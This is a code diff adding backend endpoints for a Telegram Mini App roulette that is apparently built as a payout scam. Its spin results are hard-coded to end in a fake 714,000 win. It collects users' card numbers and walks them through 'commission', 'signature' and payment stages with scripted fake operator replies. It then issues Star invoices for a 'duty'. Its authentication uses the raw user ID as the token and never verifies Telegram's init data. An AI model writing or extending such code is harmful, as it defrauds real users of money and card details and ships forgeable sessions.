@@ -19,6 +19,14 @@ const app = express()
 
 app.use(express.json())
 
+app.use((req, res, next) => {
+    res.setHeader('Access-Control-Allow-Origin', '*')
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, OPTIONS')
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+    if (req.method === 'OPTIONS') return res.sendStatus(204)
+    next()
+})
+
 const FX_USD_RUB_TTL_MS = 60 * 60 * 1000
 let fxUsdRubCache = null
 
@@ -98,6 +106,68 @@ const ensurePaymentsState = (payments) => {
     return { dutyPaidAt, dutyStars }
 }
 
+// ── Mini App state ────────────────────────────────────────────────────────────
+
+const SPIN_SEQUENCE = [
+    { spin: 'attempts', attempts: 3 },
+    { spin: 'fail-1',   amount: 0 },
+    { spin: 'fail-2',   amount: 0 },
+    { spin: '714_000',  amount: 714000 },
+]
+
+const ROULETTE_SLOT_INDEX = {
+    '350_000': 0, 'fail-1': 1, 'classic': 2, '200_000': 3, 'chips-hot': 4,
+    'attempts': 5, '10_000': 6, 'berry-coconut': 7, 'fail-2': 8, 'chips-white': 9,
+    'toyota': 10, 'original': 11, '450_000': 12, 'peach': 13, 'fail-3': 14,
+    'porsche': 15, 'home': 16, '714_000': 17, 'granat': 18, 'g63_amg': 19,
+    'fail-4': 20, 'mix': 21, '100_000': 22, '18_chips': 23, '20_000': 24,
+    'fail-5': 25, 'blueberry': 26, '1_000_000': 27, 'bmw': 28, 'mango': 29,
+    'fail-6': 30, '50_000': 31,
+}
+
+const GIFT_EXPIRES_AT = '2026-03-26T20:12:03.391487'
+
+const INITIAL_STAGES = {
+    payment_stage: 0, start_chat_stage: 0, checking_stage: 0,
+    withdrawal_chat_stage: 0, bank_commission_stage: 0, signature_stage: 0,
+}
+
+const APP_CHAT_REPLIES = [
+    { name: 'Оператор', text: 'Сообщение получено. Продолжайте оформление выплаты по инструкции на экране.', color: 'lime' },
+    { name: 'Поддержка', text: 'Для оформления выплаты следуйте инструкции на экране.', color: 'blue' },
+    { name: 'Модератор', text: 'Ваш запрос обрабатывается. Продолжайте.', color: 'purple' },
+]
+
+const ensureAppState = (app) => ({
+    spinIndex: Number.isInteger(app?.spinIndex) ? app.spinIndex : 0,
+    lastProcessedSpinIndex: Number.isInteger(app?.lastProcessedSpinIndex) ? app.lastProcessedSpinIndex : -1,
+    balance: Number.isFinite(app?.balance) ? app.balance : 0,
+    availableSpins: Number.isInteger(app?.availableSpins) ? app.availableSpins : 1,
+    cardNumber: typeof app?.cardNumber === 'string' ? app.cardNumber : '',
+    stages: { ...INITIAL_STAGES, ...(app?.stages ?? {}) },
+    chatReplyIndex: Number.isInteger(app?.chatReplyIndex) ? app.chatReplyIndex : 0,
+})
+
+function makeToken(userId) { return String(userId) }
+
+function userIdFromRequest(req) {
+    const auth = req.headers['authorization'] ?? ''
+    if (auth.startsWith('Bearer ')) {
+        const id = Number(auth.slice(7))
+        if (Number.isInteger(id) && id > 0) return id
+    }
+    return null
+}
+
+function parseInitData(raw) {
+    try {
+        const params = new URLSearchParams(raw)
+        const user = JSON.parse(params.get('user') ?? 'null')
+        if (user?.id) return user
+    } catch {}
+    return null
+}
+
 const saveAuthStore = () => {
     try {
         fs.writeFileSync(AUTH_STORE_PATH, JSON.stringify(authStore, null, 2))
@@ -105,6 +175,185 @@ const saveAuthStore = () => {
         console.error('Failed to save auth store:', err)
     }
 }
+
+// ── /api/v1/* — Mini App API backed by authStore ─────────────────────────────
+
+// POST /api/v1/auth/login  { init_data: string }
+app.post('/api/v1/auth/login', (req, res) => {
+    const initData = req.body?.init_data
+    const user = parseInitData(initData)
+    if (!user?.id) return res.status(400).json({ detail: 'invalid init_data' })
+
+    const userId = Number(user.id)
+    const nowIso = new Date().toISOString()
+    const existing = authStore[String(userId)]
+    const app_ = ensureAppState(existing?.app)
+    const payments = ensurePaymentsState(existing?.payments)
+
+    authStore[String(userId)] = {
+        userId,
+        username: user.username ?? existing?.username ?? null,
+        firstName: user.first_name ?? existing?.firstName ?? null,
+        lastName: user.last_name ?? existing?.lastName ?? null,
+        firstSeenAt: existing?.firstSeenAt ?? nowIso,
+        lastSeenAt: nowIso,
+        app: app_,
+        payments,
+        game: ensureGameState(existing?.game),
+    }
+    saveAuthStore()
+
+    const token = makeToken(userId)
+    return res.json({ access_token: token, refresh_token: token })
+})
+
+// POST /api/v1/auth/refresh
+app.post('/api/v1/auth/refresh', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const token = makeToken(userId)
+    return res.json({ access_token: token, refresh_token: token })
+})
+
+// GET /api/v1/me
+app.get('/api/v1/me', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    return res.json({
+        balance: app_.balance,
+        available_spins: app_.availableSpins,
+        gift_expires_at: GIFT_EXPIRES_AT,
+        card_number: app_.cardNumber,
+    })
+})
+
+// PATCH /api/v1/me/card-number  { card_number: string }
+app.patch('/api/v1/me/card-number', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    app_.cardNumber = String(req.body?.card_number ?? app_.cardNumber)
+    authStore[String(userId)] = { ...u, app: app_ }
+    saveAuthStore()
+    return res.json({
+        balance: app_.balance,
+        available_spins: app_.availableSpins,
+        gift_expires_at: GIFT_EXPIRES_AT,
+        card_number: app_.cardNumber,
+    })
+})
+
+// GET /api/v1/results
+app.get('/api/v1/results', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    if (app_.availableSpins <= 0) return res.status(422).json({ detail: 'No spins available' })
+    const result = SPIN_SEQUENCE[app_.spinIndex] ?? SPIN_SEQUENCE[SPIN_SEQUENCE.length - 1]
+    return res.json(result)
+})
+
+// POST /api/v1/finish
+app.post('/api/v1/finish', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    const spinIdx = app_.spinIndex
+    if (spinIdx > app_.lastProcessedSpinIndex) {
+        const spin = SPIN_SEQUENCE[spinIdx] ?? null
+        if (spin) {
+            app_.availableSpins = Math.max(0, app_.availableSpins - 1)
+            if (spin.spin === 'attempts') {
+                app_.availableSpins += spin.attempts || 3
+            } else if (typeof spin.amount === 'number' && spin.amount > 0) {
+                app_.balance = spin.amount
+            }
+            const slotIdx = ROULETTE_SLOT_INDEX[spin.spin]
+            if (slotIdx !== undefined && !app_.rouletteIdx) {
+                app_.rouletteIdx = slotIdx
+            }
+        }
+        app_.lastProcessedSpinIndex = spinIdx
+        app_.spinIndex = spinIdx + 1
+    }
+    authStore[String(userId)] = { ...u, app: app_ }
+    saveAuthStore()
+    return res.json({ status: 'ok' })
+})
+
+// GET /api/v1/stages
+app.get('/api/v1/stages', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    return res.json(ensureAppState(u.app).stages)
+})
+
+// PATCH /api/v1/stages  { <stage_name>: number, ... }
+app.patch('/api/v1/stages', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    app_.stages = { ...app_.stages, ...req.body }
+    authStore[String(userId)] = { ...u, app: app_ }
+    saveAuthStore()
+    return res.json(app_.stages)
+})
+
+// POST /api/v1/invoice  { method, amount, title, next_stages }
+app.post('/api/v1/invoice', async (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    try {
+        const { amount, title, description, next_stages } = req.body || {}
+        const stars = Number(amount)
+        if (!Number.isInteger(stars) || stars <= 0) return res.status(400).json({ detail: 'invalid amount' })
+
+        const payload = JSON.stringify({ type: 'purchase', purpose: 'duty', userId, amountStars: stars, next_stages, ts: Date.now() })
+        const r = await fetch(`https://api.telegram.org/bot${token}/createInvoiceLink`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                title: title || 'Покупка',
+                description: description || 'Оплата в Mini App',
+                payload,
+                currency: 'XTR',
+                prices: [{ label: 'Оплата', amount: stars }],
+            }),
+        })
+        const data = await r.json()
+        if (!data.ok) return res.status(500).json({ detail: data.description || 'Telegram API error' })
+        return res.json({ link: data.result })
+    } catch (e) {
+        return res.status(500).json({ detail: e.message || 'Unknown error' })
+    }
+})
+
+// POST /api/v1/chat/message  { text: string }
+app.post('/api/v1/chat/message', (req, res) => {
+    const userId = userIdFromRequest(req)
+    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
+    const u = authStore[String(userId)]
+    if (!u) return res.status(401).json({ detail: 'unauthorized' })
+    const app_ = ensureAppState(u.app)
+    const reply = APP_CHAT_REPLIES[app_.chatReplyIndex % APP_CHAT_REPLIES.length]
+    app_.chatReplyIndex += 1
+    authStore[String(userId)] = { ...u, app: app_ }
+    saveAuthStore()
+    return res.json({ name: reply.name, text: reply.text, color: reply.color, echo: req.body?.text || '' })
+})
 
 const ensureMenuButton = async () => {
     try {
